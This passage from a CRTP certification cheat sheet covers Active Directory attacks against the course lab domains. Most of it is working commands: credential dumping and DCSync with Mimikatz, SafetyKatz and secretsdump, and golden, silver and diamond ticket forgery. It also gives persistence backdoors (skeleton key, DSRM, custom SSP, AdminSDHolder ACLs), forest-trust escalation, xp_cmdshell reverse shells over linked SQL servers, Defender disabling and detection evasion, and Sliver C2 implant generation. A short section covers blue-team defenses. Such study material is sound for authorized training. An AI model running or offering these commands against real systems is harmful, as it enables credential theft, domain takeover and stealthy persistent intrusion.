# ── Remote execution (run Mimikatz on multiple machines at once) ───────────
Invoke-Mimikatz -DumpCreds -ComputerName @("dcorp-mgmt", "dcorp-adminsrv")

# ── Overpass-the-Hash (spawn process with credentials): ─────────────────
Invoke-Mimikatz -Command '"sekurlsa::pth /user:svcadmin /domain:dollarcorp.moneycorp.local /aes256:<AES256> /run:cmd.exe"'
```

### SafetyKatz (Preferred for CRTP — Better AV Evasion)

```powershell
# Run directly:
.\SafetyKatz.exe "sekurlsa::logonpasswords" "exit"
.\SafetyKatz.exe "sekurlsa::ekeys" "exit"
.\SafetyKatz.exe "lsadump::dcsync /user:dcorp\krbtgt" "exit"
.\SafetyKatz.exe "lsadump::dcsync /all /csv" "exit"
.\SafetyKatz.exe "lsadump::sam" "exit"
.\SafetyKatz.exe "token::elevate" "lsadump::sam" "exit"

# Overpass-the-Hash:
.\SafetyKatz.exe "sekurlsa::pth /user:Administrator /domain:dollarcorp.moneycorp.local /aes256:<AES256> /run:cmd.exe" "exit"
```

### DCSync — Replicate AD Credentials

```powershell
# Requires: Domain Admin OR DCSync ACL rights
# (GetChanges + GetChangesAll extended rights on domain object)

# Dump specific user:
.\SafetyKatz.exe "lsadump::dcsync /user:dcorp\krbtgt" "exit"
.\SafetyKatz.exe "lsadump::dcsync /user:dcorp\Administrator" "exit"
.\SafetyKatz.exe "lsadump::dcsync /domain:moneycorp.local /user:mcorp\krbtgt" "exit"

# Dump ALL users:
.\SafetyKatz.exe "lsadump::dcsync /all /csv" "exit"

# Impacket from Kali:
secretsdump.py dollarcorp.moneycorp.local/Administrator:password@172.16.2.1
secretsdump.py -hashes :<NTLM> dollarcorp.moneycorp.local/Administrator@172.16.2.1
secretsdump.py -just-dc dollarcorp.moneycorp.local/Administrator:pass@172.16.2.1
```

### Credential Locations to Check

```powershell
# PowerShell history (gold mine for credentials):
type $env:APPDATA\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt

# Stored credentials:
cmdkey /list
# Use with: runas /savecred /user:domain\user cmd.exe

# Registry credential stores:
reg query HKLM /f password /t REG_SZ /s 2>nul
reg query HKCU /f password /t REG_SZ /s 2>nul
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\Currentversion\Winlogon"

# Unattend.xml, web.config, etc:
Get-ChildItem -Recurse -Force -Path C:\ -Include "unattend.xml","sysprep.xml","web.config","appsettings.json" 2>$null

# SYSVOL GPP passwords (legacy but still found):
findstr /S /I cpassword \\dollarcorp.moneycorp.local\sysvol\dollarcorp.moneycorp.local\policies\*.xml
# Decrypt: gpp-decrypt <cpassword_value>
```

---

## 16 Domain Persistence — Golden Ticket

### Understanding the Golden Ticket

```
╔═══════════════════════════════════════════════════════════════╗
║  The Golden Ticket is a forged Ticket Granting Ticket (TGT)  ║
║  signed by the KRBTGT account hash.                          ║
║                                                               ║
║  The KDC trusts any properly signed TGT.                     ║
║  We can forge a TGT for ANY user (including nonexistent      ║
║  users) valid for any duration.                               ║
║                                                               ║
║  Requirements: krbtgt NTLM/AES hash + domain SID            ║
║  Persistence: Even if all DA passwords change, the           ║
║               Golden Ticket works until krbtgt is reset.     ║
║  Note: krbtgt should be reset TWICE to invalidate tickets.   ║
╚═══════════════════════════════════════════════════════════════╝
```

### Extract krbtgt Hash

```powershell
# Method 1: DCSync (requires DA or DCSync rights)
.\SafetyKatz.exe "lsadump::dcsync /user:dcorp\krbtgt" "exit"
# Note the: NTLM hash AND AES256 hash

# Method 2: From DC memory (requires DA)
Invoke-Mimikatz -Command '"lsadump::lsa /patch"'

# Method 3: VSS copy of NTDS.dit:
vssadmin create shadow /for=C:
copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\NTDS\NTDS.dit C:\ntds.dit
copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\System32\config\SYSTEM C:\system.bak
# Transfer to Kali: secretsdump.py -ntds ntds.dit -system system.bak LOCAL
```

### Forge Golden Ticket

```powershell
# Get domain SID:
Get-DomainSID  # PowerView
# OR: (Get-ADDomain).DomainSID
# OR from krbtgt dump output

# ── Mimikatz Golden Ticket ────────────────────────────────────────────────
Invoke-Mimikatz -Command '"kerberos::golden /User:Administrator /domain:dollarcorp.moneycorp.local /sid:S-1-5-21-XXXXXXXXXX-XXXXXXXXXX-XXXXXXXXXX /aes256:<KRBTGT_AES256> /id:500 /groups:512 /startoffset:0 /endin:600 /renewmax:10080 /ptt"'

# Parameters:
# /User:      Any username (even fake ones work)
# /domain:    Domain FQDN
# /sid:       Domain SID (NOT the user SID — the domain SID)
# /aes256:    krbtgt AES256 key (preferred — harder to detect than NTLM)
# /ntlm:      krbtgt NTLM hash (alternative to aes256)
# /id:        RID (500 = Administrator)
# /groups:    Group RIDs (512 = Domain Admins)
# /ptt:       Pass-the-ticket (inject into current session)
# /ticket:    Save to file instead of injecting

# Save to file and use later:
Invoke-Mimikatz -Command '"kerberos::golden /User:Administrator /domain:dollarcorp.moneycorp.local /sid:S-1-5-21-... /aes256:<HASH> /ticket:golden.kirbi"'

# Inject later:
Invoke-Mimikatz -Command '"kerberos::ptt golden.kirbi"'

# ── Rubeus Golden Ticket ──────────────────────────────────────────────────
.\Rubeus.exe golden /aes256:<KRBTGT_AES256> /user:Administrator /id:500 /domain:dollarcorp.moneycorp.local /sid:S-1-5-21-... /ptt

# Verify ticket injected:
klist

# Access DC:
ls \\dcorp-dc\c$
Enter-PSSession -ComputerName dcorp-dc
.\SafetyKatz.exe "lsadump::dcsync /user:dcorp\krbtgt" "exit"
```

---

## 17 Domain Persistence — Silver Ticket

### Understanding the Silver Ticket

```
╔════════════════════════════════════════════════════════════════╗
║  A Silver Ticket is a forged TGS (service ticket) for a      ║
║  SPECIFIC service.                                             ║
║                                                               ║
║  Signed with the SERVICE ACCOUNT'S hash (not krbtgt).        ║
║  The DC is NOT contacted during service access.               ║
║  → Less noisy than Golden Ticket.                             ║
║                                                               ║
║  Useful when you have a service account hash but NOT DA.      ║
╚════════════════════════════════════════════════════════════════╝

Common silver ticket targets:
  cifs   → file shares (ls \\host\c$)
  host   → scheduled tasks, services
  http   → WinRM, PowerShell remoting
  ldap   → LDAP queries (DCSync)
  mssql  → SQL server access
  rpcss  → WMI access
```

### Forge Silver Ticket

```powershell
# Requires: target machine account NTLM hash (or service account hash)
# Get machine hash: SafetyKatz "sekurlsa::logonpasswords" on machine

# Forge CIFS (file share) Silver Ticket:
Invoke-Mimikatz -Command '"kerberos::golden /User:Administrator /domain:dollarcorp.moneycorp.local /sid:S-1-5-21-... /target:dcorp-mssql.dollarcorp.moneycorp.local /service:cifs /rc4:<MACHINE_NTLM> /ptt"'

# Forge HOST service (for scheduled tasks, PSExec-like access):
Invoke-Mimikatz -Command '"kerberos::golden /User:Administrator /domain:dollarcorp.moneycorp.local /sid:S-1-5-21-... /target:dcorp-mssql.dollarcorp.moneycorp.local /service:host /rc4:<MACHINE_NTLM> /ptt"'

# Forge LDAP service (for DCSync without touching DC directly):
Invoke-Mimikatz -Command '"kerberos::golden /User:Administrator /domain:dollarcorp.moneycorp.local /sid:S-1-5-21-... /target:dcorp-dc.dollarcorp.moneycorp.local /service:ldap /rc4:<DC_MACHINE_NTLM> /ptt"'

# Use the forged ticket:
ls \\dcorp-mssql\c$                                # CIFS
Invoke-Command -ComputerName dcorp-mssql ...       # HOST + HTTP
.\SafetyKatz.exe "lsadump::dcsync /user:dcorp\krbtgt" "exit"   # LDAP
```

---

## 18 Domain Persistence — Diamond Ticket

### Understanding Diamond Ticket

```
╔════════════════════════════════════════════════════════════════╗
║  Diamond Ticket = Modified REAL TGT (from the KDC)           ║
║  (not fully forged like Golden Ticket)                        ║
║                                                               ║
║  Uses a legitimate TGT as base, then modifies it to add      ║
║  DA group memberships.                                        ║
║                                                               ║
║  Much harder to detect than Golden Ticket because:           ║
║  - It IS a real ticket signed by the KDC                     ║
║  - Contains valid metadata (logon time, etc.)                 ║
║  - Uses the same encryption nonce as original                 ║
╚════════════════════════════════════════════════════════════════╝
```

### Forge Diamond Ticket

```powershell
# Requires: krbtgt AES256 hash AND valid user TGT

# Using Rubeus:
.\Rubeus.exe diamond /krbkey:<KRBTGT_AES256> /user:student1 /password:student1pass /domain:dollarcorp.moneycorp.local /dc:dcorp-dc.dollarcorp.moneycorp.local /enctype:aes /ticketuser:Administrator /ticketuserid:500 /groups:512 /ptt

# Verify:
klist
whoami /groups

# Access DA resources:
ls \\dcorp-dc\c$
```

---

## 19 Domain Persistence — Skeleton Key

### Understanding Skeleton Key

```
╔═══════════════════════════════════════════════════════════════╗
║  Skeleton Key patches the LSASS process on the DC to         ║
║  add a "master password" that works for ALL accounts.        ║
║                                                               ║
║  After injection:                                             ║
║  - All existing passwords continue to work (no disruption)   ║
║  - "mimikatz" also works as password for EVERY account       ║
║                                                               ║
║  IMPORTANT: Reboot of DC removes the skeleton key.           ║
║  NOISY: Patches LSASS — EDR will almost certainly alert.    ║
╚═══════════════════════════════════════════════════════════════╝
```

### Inject Skeleton Key

```powershell
# Must run from DC with DA privileges:
Invoke-Mimikatz -Command '"privilege::debug" "misc::skeleton"' -ComputerName dcorp-dc

# OR via PSRemoting session on DC:
$sess = New-PSSession -ComputerName dcorp-dc
Invoke-Command -Session $sess -FilePath C:\AD\Tools\Invoke-Mimikatz.ps1
Invoke-Command -Session $sess -ScriptBlock {
    Invoke-Mimikatz -Command '"privilege::debug" "misc::skeleton"'
}

# After injection — use "mimikatz" as the password for any user:
Enter-PSSession -ComputerName dcorp-dc -Credential dcorp\Administrator
# Password: mimikatz

net use \\dcorp-dc\c$ /user:dcorp\Administrator mimikatz
```

---

## 20 Domain Persistence — DSRM

### Understanding DSRM Abuse

```
╔══════════════════════════════════════════════════════════════╗
║  Every Domain Controller has a DSRM (Directory Services     ║
║  Restore Mode) local administrator account.                  ║
║                                                               ║
║  This account has full access to the DC in restore mode.    ║
║  By default it cannot log in over network.                   ║
║                                                               ║
║  Changing registry key allows network login with DSRM        ║
║  credentials → persistent DA equivalent access.             ║
╚══════════════════════════════════════════════════════════════╝
```

### DSRM Persistence Attack

```powershell
# Step 1: Dump DSRM hash from DC (needs DA):
Invoke-Mimikatz -Command '"token::elevate" "lsadump::sam"' -ComputerName dcorp-dc
# Note the "Administrator" NTLM hash (this is the DSRM Administrator)

# Step 2: Change registry to allow network login with DSRM:
New-ItemProperty "HKLM:\System\CurrentControlSet\Control\Lsa\" -Name "DsrmAdminLogonBehavior" -Value 2 -PropertyType DWORD
# Or on DC remotely via PSSession:
Invoke-Command -ComputerName dcorp-dc -ScriptBlock {
    New-ItemProperty "HKLM:\System\CurrentControlSet\Control\Lsa\" `
      -Name "DsrmAdminLogonBehavior" -Value 2 -PropertyType DWORD
}

# Step 3: Pass-the-Hash with DSRM administrator hash:
Invoke-Mimikatz -Command '"sekurlsa::pth /domain:dcorp-dc /user:Administrator /ntlm:<DSRM_NTLM> /run:powershell.exe"'
# In new window:
ls \\dcorp-dc\c$
Enter-PSSession -ComputerName dcorp-dc
```

---

## 21 Domain Persistence — Custom SSP

### Understanding Custom SSP

```
╔═══════════════════════════════════════════════════════════════╗
║  SSP (Security Support Provider) is a DLL loaded into        ║
║  LSASS that can be used for authentication.                  ║
║                                                               ║
║  By adding our own SSP (mimilib.dll from Mimikatz),          ║
║  ALL logon credentials are captured and written to disk.     ║
║                                                               ║
║  Survives reboots (DLL is registered in registry).           ║
╚═══════════════════════════════════════════════════════════════╝
```

### Custom SSP via Mimikatz (Memory Patch)

```powershell
# In-memory injection (does NOT survive reboot):
Invoke-Mimikatz -Command '"misc::memssp"' -ComputerName dcorp-dc

# After injection, all logins are captured to:
# C:\Windows\system32\mimilsa.log

# Check captured credentials:
type C:\Windows\system32\mimilsa.log
```

### Custom SSP via Registry (Persistent)

```powershell
# Copy mimilib.dll to DC:
copy C:\AD\Tools\mimilib.dll \\dcorp-dc\c$\Windows\System32\

# Add to Security Packages registry:
$packages = Get-ItemProperty HKLM:\SYSTEM\CurrentControlSet\Control\Lsa\ -Name 'Security Packages' | select -ExpandProperty 'Security Packages'
$packages += "mimilib"
Set-ItemProperty HKLM:\SYSTEM\CurrentControlSet\Control\Lsa\ -Name 'Security Packages' -Value $packages

# After reboot of DC, all logons captured to mimilsa.log
```

---

## 22 Domain Persistence — ACL Backdoors

### AdminSDHolder — Protected Group Backdoor

```
╔═══════════════════════════════════════════════════════════════╗
║  AdminSDHolder is a special AD container that holds the      ║
║  template ACLs for "protected groups" (DA, EA, etc.).        ║
║                                                               ║
║  SDProp runs every 60 minutes and OVERWRITES the ACLs of     ║
║  all protected group members with the AdminSDHolder ACL.     ║
║                                                               ║
║  If we add ourselves to AdminSDHolder with GenericAll,       ║
║  SDProp will propagate that to ALL Domain Admins.            ║
║  → Persistent DA-equivalent rights, even after we are        ║
║    removed from DA group!                                    ║
╚═══════════════════════════════════════════════════════════════╝
```

```powershell
# Add student1 with GenericAll to AdminSDHolder:
Add-DomainObjectAcl -TargetIdentity 'CN=AdminSDHolder,CN=System,DC=dollarcorp,DC=moneycorp,DC=local' `
  -PrincipalIdentity student1 `
  -Rights All -Verbose

# Verify:
Get-DomainObjectAcl -SearchBase "CN=AdminSDHolder,CN=System,DC=dollarcorp,DC=moneycorp,DC=local" `
  -ResolveGUIDs | ?{$_.IdentityReferenceName -match "student1"}

# Wait for SDProp to run (60 min) OR force it:
$sess = New-PSSession -ComputerName dcorp-dc
Invoke-Command -Session $sess -ScriptBlock {
    $InvokeReplicaSync = [System.DirectoryServices.ActiveDirectory.Forest]::GetCurrentForest()
    # Force SDProp via ldapsearch or registry
}

# Force SDProp manually via task:
Invoke-Command -ComputerName dcorp-dc -ScriptBlock {
    $cmd = "C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -enc " +
           [Convert]::ToBase64String([Text.Encoding]::Unicode.GetBytes("Import-Module ActiveDirectory; $sd = Get-ADObject 'CN=AdminSDHolder,CN=System,DC=dollarcorp,DC=moneycorp,DC=local'; Set-ADObject 'CN=Domain Admins,CN=Users,DC=dollarcorp,DC=moneycorp,DC=local' -Replace @{nTSecurityDescriptor=$sd.nTSecurityDescriptor}"))
}

# After propagation, student1 has GenericAll on ALL Domain Admins
# Reset any DA's password using GenericAll:
Set-DomainUserPassword -Identity svcadmin -AccountPassword (ConvertTo-SecureString "NewPass@1234" -AsPlainText -Force)
```

### DCSync ACL Rights

```powershell
# Grant student1 DCSync rights (minimal rights, very stealthy):
Add-DomainObjectAcl -TargetIdentity "dc=dollarcorp,dc=moneycorp,dc=local" `
  -PrincipalIdentity student1 `
  -Rights DCSync -Verbose

# Verify:
Get-DomainObjectAcl -TargetIdentity "dc=dollarcorp,dc=moneycorp,dc=local" `
  -ResolveGUIDs | ?{$_.IdentityReferenceName -match "student1" -and $_.ObjectAceType -match "Replication"}

# Now perform DCSync as student1 (no DA required):
.\SafetyKatz.exe "lsadump::dcsync /user:dcorp\krbtgt" "exit"
```

---

## 23 Domain Persistence — Security Descriptors

### Remote Registry Backdoor

```powershell
# Set security descriptor on DC's RemoteRegistry to allow student1 access:
Set-RemoteRegistryBackdoor -ComputerName dcorp-dc -Trustee 'dcorp\student1' -Verbose

# Now student1 can access DC's registry remotely without DA:
reg query \\dcorp-dc\HKLM\SYSTEM\CurrentControlSet\Control\Lsa
```

### WMI Security Descriptor

```powershell
# Allow student1 to use WMI on DC without DA:
Set-DomainObjectAcl -TargetIdentity "dcorp-dc" `
  -PrincipalIdentity student1 `
  -Rights All -Verbose

# OR using Set-RemoteWMI:
Set-RemoteWMI -ComputerName dcorp-dc -UserName 'dcorp\student1' -Verbose

# Now student1 can execute WMI on DC:
Get-WmiObject -Class Win32_OperatingSystem -ComputerName dcorp-dc
Invoke-WmiMethod -Class Win32_Process -Name Create -ArgumentList "cmd.exe /c whoami > C:\out.txt" -ComputerName dcorp-dc
```

### PSRemoting Security Descriptor

```powershell
# Allow student1 to PSRemote to DC without DA:
Set-RemotePSRemoting -ComputerName dcorp-dc -UserName 'dcorp\student1' -Verbose

# student1 can now run:
Invoke-Command -ComputerName dcorp-dc -ScriptBlock {whoami; hostname}
```

---

## 24 Cross-Domain Attacks — Child to Forest Root

### Understanding Forest Escalation

```
╔══════════════════════════════════════════════════════════════════╗
║  CRTP Lab Structure:                                            ║
║                                                                 ║
║  dollarcorp.moneycorp.local  (child domain)                    ║
║         ↕ (bidirectional parent-child trust)                   ║
║  moneycorp.local             (forest root)                     ║
║                                                                 ║
║  Goal: Escalate from Domain Admin in dollarcorp                ║
║        to Enterprise Admin in moneycorp (forest root)          ║
║                                                                 ║
║  Two methods:                                                   ║
║  1. Krbtgt hash of child domain (+ SID of child)               ║
║  2. Trust ticket (inter-domain TGT using trust key)            ║
╚══════════════════════════════════════════════════════════════════╝
```

### Method 1: Child Domain krbtgt Hash → Forest Root

```powershell
# Step 1: Get child domain SID:
Get-DomainSID                              # S-1-5-21-CHILD_DOMAIN_SID
# Get Enterprise Admins SID (from forest root):
Get-DomainSID -Domain moneycorp.local      # S-1-5-21-FOREST_ROOT_SID
# Enterprise Admins RID is always 519: S-1-5-21-FOREST_ROOT_SID-519

# Step 2: Dump krbtgt hash of child domain (dollarcorp):
.\SafetyKatz.exe "lsadump::dcsync /user:dcorp\krbtgt" "exit"

# Step 3: Forge inter-realm Golden Ticket with SID history of Enterprise Admins:
.\BetterSafetyKatz.exe "kerberos::golden /User:Administrator /domain:dollarcorp.moneycorp.local /sid:S-1-5-21-CHILD-SID /sids:S-1-5-21-FOREST-ROOT-SID-519 /krbtgt:<CHILD_KRBTGT_AES256> /ptt"

# Parameters:
# /sid:    Child domain SID
# /sids:   SID to inject into SID history — use EA SID
#          This adds Enterprise Admins membership to the ticket!

# Step 4: Access forest root DC:
klist   # Verify ticket
ls \\mcorp-dc.moneycorp.local\c$
Enter-PSSession -ComputerName mcorp-dc.moneycorp.local

# Step 5: DCSync on forest root:
.\SafetyKatz.exe "lsadump::dcsync /user:mcorp\krbtgt /domain:moneycorp.local" "exit"
.\SafetyKatz.exe "lsadump::dcsync /user:mcorp\Administrator /domain:moneycorp.local" "exit"
```

### Method 2: Trust Ticket (Inter-Realm TGT)

```powershell
# Step 1: Get trust key (trust account hash) between child and parent:
.\SafetyKatz.exe "lsadump::trust /patch" "exit"
# Look for: [In]  moneycorp.local → NTLM hash (this is the trust key)
# OR via DCSync:
.\SafetyKatz.exe "lsadump::dcsync /user:dcorp\mcorp$" "exit"

# Step 2: Forge inter-realm TGT:
.\BetterSafetyKatz.exe "kerberos::golden /User:Administrator /domain:dollarcorp.moneycorp.local /sid:S-1-5-21-CHILD-SID /sids:S-1-5-21-FOREST-ROOT-SID-519 /rc4:<TRUST_NTLM_KEY> /service:krbtgt /target:moneycorp.local /ticket:trust_ticket.kirbi"

# Step 3: Get TGS using the inter-realm TGT:
.\Rubeus.exe asktgs /ticket:trust_ticket.kirbi /service:cifs/mcorp-dc.moneycorp.local /dc:mcorp-dc.moneycorp.local /ptt

# Step 4: Access parent domain resources:
ls \\mcorp-dc.moneycorp.local\c$
```

---

## 25 Cross-Forest Trust Attacks

### Understanding External Trusts

```
╔═══════════════════════════════════════════════════════════════╗
║  External/Forest trust between:                              ║
║  moneycorp.local ↔ eurocorp.local                           ║
║                                                               ║
║  SID Filtering is usually ENABLED on external trusts        ║
║  → Blocks SID history injection                             ║
║                                                               ║
║  BUT: Kerberoasting across trusts still works.              ║
║  AND: If SID filtering misconfigured → SID history works.   ║
╚═══════════════════════════════════════════════════════════════╝
```

### Enumerate Cross-Forest

```powershell
# Enumerate users in the external forest:
Get-DomainUser -Domain eurocorp.local | select samaccountname
Get-DomainComputer -Domain eurocorp.local | select name,dnshostname
Get-DomainGroup -Domain eurocorp.local | select name

# Enumerate trusts:
Get-DomainTrust -Domain eurocorp.local
Get-ForestTrust

# Foreign Users (users from one domain with rights in another):
Get-DomainForeignGroupMember -Domain eurocorp.local
Get-DomainForeignUser
```

### Kerberoasting Across Forest Trust

```powershell
# If trust allows Kerberos auth, SPNs in trusted forest are roastable:
Get-DomainUser -SPN -Domain eurocorp.local | select samaccountname,serviceprincipalname

# Request ticket across trust:
.\Rubeus.exe kerberoast /domain:eurocorp.local /outfile:eurocorp_kerb.hash

# Crack:
hashcat -m 13100 eurocorp_kerb.hash rockyou.txt
```

### SID History Injection (If SID Filtering Disabled)

```powershell
# Check if SID filtering is enabled on trust:
Get-DomainTrust | select SourceName,TargetName,TrustAttributes
# FILTER_SIDS attribute present = SID filtering on
# If TREAT_AS_EXTERNAL is not set on forest trust → SID history injection may work

# If SID history injection works across forest:
# Add Enterprise Admins SID of target forest to our ticket's SID history:
.\BetterSafetyKatz.exe "kerberos::golden /User:Administrator /domain:moneycorp.local /sid:S-1-5-21-MCORP-SID /sids:S-1-5-21-EUROCORP-DOMAIN-SID-519 /krbtgt:<MCORP_KRBTGT> /ptt"

ls \\eu-dc.eurocorp.local\c$
```

---

## 26 MSSQL Server Attacks

### MSSQL in CRTP Context

```
╔══════════════════════════════════════════════════════════════╗
║  MSSQL servers are common in enterprise AD environments.    ║
║  They can be leveraged for:                                  ║
║  1. Code execution (via xp_cmdshell)                        ║
║  2. Credential theft                                         ║
║  3. Lateral movement via linked servers                     ║
║  4. Cross-forest attacks via database links                 ║
╚══════════════════════════════════════════════════════════════╝
```

### PowerUpSQL — MSSQL Enumeration

```powershell
# Load PowerUpSQL:
Import-Module C:\AD\Tools\PowerUpSQL\PowerUpSQL.ps1

# Discover MSSQL instances in the domain:
Get-SQLInstanceDomain -Verbose
Get-SQLInstanceDomain | Get-SQLServerInfo -Verbose

# Check accessible instances:
Get-SQLInstanceDomain | Get-SQLConnectionTest | ?{$_.Status -eq "Accessible"}

# Get server info:
Get-SQLServerInfo -Instance dcorp-mssql.dollarcorp.moneycorp.local

# Enumerate databases:
Get-SQLDatabase -Instance dcorp-mssql.dollarcorp.moneycorp.local -Verbose

# Check for sysadmin role:
Get-SQLServerRoleMember -Instance dcorp-mssql -RolePrincipalName sysadmin

# Run automated audit:
Invoke-SQLAudit -Instance dcorp-mssql -Verbose
```

### Execute OS Commands via xp_cmdshell

```powershell
# Check if xp_cmdshell is enabled:
Invoke-SQLQuery -Instance dcorp-mssql -Query "EXEC xp_cmdshell 'whoami'"

# Enable xp_cmdshell if disabled (needs sysadmin):
Invoke-SQLQuery -Instance dcorp-mssql -Query "EXEC sp_configure 'show advanced options', 1; RECONFIGURE;"
Invoke-SQLQuery -Instance dcorp-mssql -Query "EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE;"

# Execute OS commands:
Invoke-SQLOSCmd -Instance dcorp-mssql -Command "whoami" -RawResults
Invoke-SQLOSCmd -Instance dcorp-mssql -Command "net user /domain"
Invoke-SQLOSCmd -Instance dcorp-mssql -Command "powershell -enc <PAYLOAD>"
```

### Lateral Movement via Linked Servers

```powershell
# Find linked servers:
Get-SQLServerLink -Instance dcorp-mssql -Verbose

# Check link chain:
Get-SQLServerLinkCrawl -Instance dcorp-mssql -Verbose

# Execute command on a linked server:
Get-SQLServerLinkCrawl -Instance dcorp-mssql -Query "exec master..xp_cmdshell 'whoami'" -QueryTarget eu-sql

# Direct query with linked server:
Invoke-SQLQuery -Instance dcorp-mssql -Query "SELECT * FROM OPENQUERY([eu-sql], 'SELECT system_user')"

# Enable xp_cmdshell on linked server:
Invoke-SQLQuery -Instance dcorp-mssql -Query "EXEC ('sp_configure ''xp_cmdshell'',1;reconfigure') AT eu-sql"

# Run command on linked server:
Invoke-SQLQuery -Instance dcorp-mssql -Query "EXEC ('xp_cmdshell ''whoami''') AT eu-sql"

# Reverse shell via linked server:
Invoke-SQLQuery -Instance dcorp-mssql -Query "EXEC ('xp_cmdshell ''powershell -enc <B64_PAYLOAD>''') AT eu-sql"
```

---

## 27 Defenses & Detection Bypasses

### Microsoft Defender for Identity (MDI) — Understanding Detections

```
╔═══════════════════════════════════════════════════════════════╗
║  MDI (formerly Azure ATP) detects:                           ║
║  - Golden Ticket usage                                        ║
║  - DCSync requests                                            ║
║  - Kerberoasting (many TGS requests)                         ║
║  - Lateral movement patterns                                  ║
║  - Mimikatz usage                                             ║
║  - Pass-the-Hash / Overpass-the-Hash                         ║
║  - Skeleton Key injection                                     ║
║  - Directory service replication (DCSync)                    ║
╚═══════════════════════════════════════════════════════════════╝
```

### Bypassing MDI Detections

```powershell
# ── DCSync: Use AES256 instead of RC4/NTLM ────────────────────────────────
# MDI detects anomalous NTLM-encrypted DCSync
# Use /aes256 flag instead of /ntlm in all Mimikatz commands:
.\SafetyKatz.exe "lsadump::dcsync /user:dcorp\krbtgt" "exit"
# In Rubeus, always use /aes256 for pth operations

# ── Kerberoasting: Limit requests ─────────────────────────────────────────
# MDI detects high volume of TGS requests
# Only request tickets for accounts we actually need:
.\Rubeus.exe kerberoast /user:svcadmin /nowrap    # Target specific accounts
.\Rubeus.exe kerberoast /rc4opsec                 # Request RC4 tickets to avoid detection

# ── Golden Ticket: Use Diamond Ticket instead ─────────────────────────────
# Diamond tickets are real KDC-issued tickets — much harder to detect
# See Module 18 for Diamond Ticket implementation

# ── Disable Defender (lab only — very noisy IRL): ─────────────────────────
Set-MpPreference -DisableRealtimeMonitoring $True

# Exclusion (stealthier than disabling):
Add-MpPreference -ExclusionPath "C:\AD\Tools"
Add-MpPreference -ExclusionProcess "powershell.exe"

# ── Bypass Defender via AV signature modification: ────────────────────────
# CRTP provides pre-modified tool versions:
# C:\AD\Tools\InvisiShell\          → PS logging bypass
# C:\AD\Tools\SafetyKatz.exe        → Mimikatz .NET port
# C:\AD\Tools\BetterSafetyKatz.exe  → Modified SafetyKatz
# C:\AD\Tools\Rubeus_4.0.0.exe      → Modified Rubeus
```

### Defense Strategies (Blue Team Notes)

```powershell
# ── Privileged Access Workstations (PAW) ─────────────────────────────────
# DAs should only log in from dedicated PAW machines
# Never log into non-DC machines with DA credentials

# ── Tiered Administration Model ───────────────────────────────────────────
# Tier 0: Domain Controllers, PKI, ADFS
# Tier 1: Servers
# Tier 2: Workstations

# ── Protected Users Security Group ───────────────────────────────────────
# Members cannot use NTLM, DES, or RC4 Kerberos
# Tickets are non-renewable and non-delegatable
# Credentials not cached on non-DC hosts
Add-ADGroupMember -Identity "Protected Users" -Members "DA_account"

# ── Enable Audit Policies for detection: ──────────────────────────────────
auditpol /set /subcategory:"Kerberos Authentication Service" /success:enable /failure:enable
auditpol /set /subcategory:"Kerberos Service Ticket Operations" /success:enable /failure:enable

# ── Detect Kerberoasting ─────────────────────────────────────────────────
# Event ID 4769 — Kerberos Service Ticket was requested
# Look for: Ticket Encryption Type = 0x17 (RC4) — modern services use AES

# ── Detect Golden Ticket ─────────────────────────────────────────────────
# Event ID 4768 — TGT requested
# Golden Ticket: Account Name != account in AD OR impossible logon times
# Ticket lifetime > 10 hours (default max) is suspicious
```

---

## 28 Sliver C2 Framework

### Why Sliver in CRTP?

```
╔══════════════════════════════════════════════════════════════╗
║  CRTP now includes Sliver C2 as an alternative to using     ║
║  standalone tools.                                           ║
║  Sliver provides:                                            ║
║  - Encrypted C2 channels (HTTPS, WireGuard, mTLS)          ║
║  - Session management across multiple targets               ║
║  - Built-in pivoting / port forwarding                      ║
║  - Armory (extension system for BOFs and aliases)           ║
║  - OPSEC-friendly features                                  ║
╚══════════════════════════════════════════════════════════════╝
```

### Sliver Setup

```bash
# Start Sliver server:
sliver-server

# Start Sliver client:
sliver

# Generate implant:
generate --http <LHOST>:443 --os windows --arch amd64 --format exe --name implant

# Generate with multiple C2:
generate --http <LHOST>:443 --http <LHOST>:80 --os windows --arch amd64 --format exe

# Start listener:
http --lhost 0.0.0.0 --lport 443

# Once implant runs on victim:
sessions         # List active sessions
use <session_id> # Interact with session
```

### Sliver Commands for CRTP

```
# In an active session:
info              # System information
whoami            # Current user
pwd; ls; cat      # File operations
shell             # Interactive shell
execute -o cmd /c whoami    # Execute command

# Process operations:
ps                # List processes
migrate <PID>     # Migrate to process

# Network:
netstat           # Active connections
ifconfig          # Network interfaces
portfwd add --remote 192.168.1.1:80 --local 127.0.0.1:8080   # Port forward
socks5 start --lport 1080     # SOCKS5 proxy

# Pivot:
pivots tcp --lport 9090       # Create pivot listener on implant

# OPSEC:
getprivs          # Token privileges
impersonate <user> # Impersonate token
make-token <user> <domain> <pass>  # Create logon session

# File transfer:
upload /kali/tool.exe C:\Windows\Temp\tool.exe
download C:\sensitive\file.txt /kali/

# Execute .NET assembly in memory:
execute-assembly /kali/Rubeus.exe kerberoast /outfile:kerb.hash
execute-assembly /kali/SafetyKatz.exe "sekurlsa::logonpasswords" "exit"
execute-assembly /kali/SharpHound.exe -c All
```

---



## 29 Essential Resources & Links

### Official Course

| Resource | URL |
|----------|-----|
| CRTP Course Page | https://www.alteredsecurity.com/adlab |
| Altered Security | https://www.alteredsecurity.com |
| Lab Portal | https://enterprisesecurity.io |
| CRTP FAQ Blog | https://www.alteredsecurity.com/post/certified-red-team-professional-crtp |
| Bootcamp Info | https://www.alteredsecurity.com/crtp-bootcamp |
| Certification Path (CRTE) | https://www.alteredsecurity.com/redteamlab |

### Core Tools Used in CRTP

| Tool | Use | URL |
|------|-----|-----|
| PowerView | AD enumeration | https://github.com/PowerShellMafia/PowerSploit |
| BloodHound | Attack path mapping | https://github.com/BloodHoundAD/BloodHound |
| SharpHound | BloodHound data collection | https://github.com/BloodHoundAD/SharpHound |
| Rubeus | Kerberos ticket attacks | https://github.com/GhostPack/Rubeus |
| SafetyKatz | Mimikatz .NET port | https://github.com/GhostPack/SafetyKatz |
| Mimikatz | Credential extraction | https://github.com/gentilkiwi/mimikatz |
| PowerUpSQL | MSSQL attacks | https://github.com/NetSPI/PowerUpSQL |
